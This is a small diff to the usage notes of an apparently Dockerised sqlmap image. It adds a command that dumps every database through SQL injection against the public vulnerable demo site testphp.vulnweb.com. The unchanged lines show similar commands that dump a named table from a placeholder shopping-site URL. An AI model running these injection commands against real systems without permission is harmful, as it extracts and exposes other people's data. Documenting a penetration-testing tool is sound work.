@@ -12,5 +12,8 @@ docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10" -D
 ## dump table tablename from database databasename
 docker run --rm -it sqlmap:1.0 --url "http://www.site.com/checkout.php?id=10" -D databasename -T tablename --dump
 
+## dump all stuff !!!!!!!!
+docker run --rm -it sqlmap:1.0 --url http://testphp.vulnweb.com/listproducts.php?cat=1 --dump-all
+
 ### original script and command
 https://github.com/paoloo/sqlmap
